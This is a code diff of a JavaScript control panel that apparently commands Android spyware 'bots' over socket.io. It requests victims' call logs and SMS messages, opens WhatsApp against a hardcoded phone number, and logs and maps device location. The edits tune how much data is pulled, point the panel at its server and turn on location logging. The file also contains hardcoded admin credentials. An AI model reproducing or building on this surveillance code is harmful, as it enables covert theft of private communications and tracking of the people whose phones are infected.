@@ -1,5 +1,6 @@
-var socket = io.connect('http://localhost:3000');       //Connect socket to node.js server
+var socket = io.connect(window.location.host);       //Connect socket to node.js server
 
+console.log(window.location.host);
 socket.emit('registerAdmin', {usrType: 'admin', usrName: 'kiran', pass: 'suthar'});     //Register
 
 var _botDataList = [];      //TO store multiple bots data
@@ -115,7 +116,7 @@ function getCallLog() {
     hideOtherTabs('callLog_div');
     if (refresh_check.checked || firstLoadCallLog) {
         callLog_div.innerHTML = 'Loading call-log, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'getCallHistory', arg1: 100}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'getCallHistory', arg1: 35}], uid: currentUID});
     }
     firstLoadCallLog = false;
     refresh_check.checked = false;
@@ -125,7 +126,7 @@ function getMessages() {
     hideOtherTabs('messages_div');
     if (refresh_check.checked || firstLoadMessages) {
         messages_div.innerHTML = 'Loading messages, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'getSms', arg1: 50}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'getSms', arg1: 10}], uid: currentUID});
     }
     firstLoadMessages = false;
     refresh_check.checked = false;
@@ -145,7 +146,7 @@ function getImages() {
     if (refresh_check.checked || firstLoadImages) {
         i = 0;
         images_div.innerHTML = 'Loading images, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'openWhatsApp', arg1: '7409062770', arg2: 'jadfhjsd'}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'openWhatsApp', arg1: '+917409062770', arg2: 'jadfhjsd'}], uid: currentUID});
 
         // setTimeout(function () {
         //     socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
@@ -253,7 +254,7 @@ function handleMessages(data) {
 }
 
 function handleLocation(data) {
-    //console.log(data);
+    console.log(data);
 
     var locJSON = JSON.parse(data.location);
     myMap(locJSON.lat, locJSON.lon);
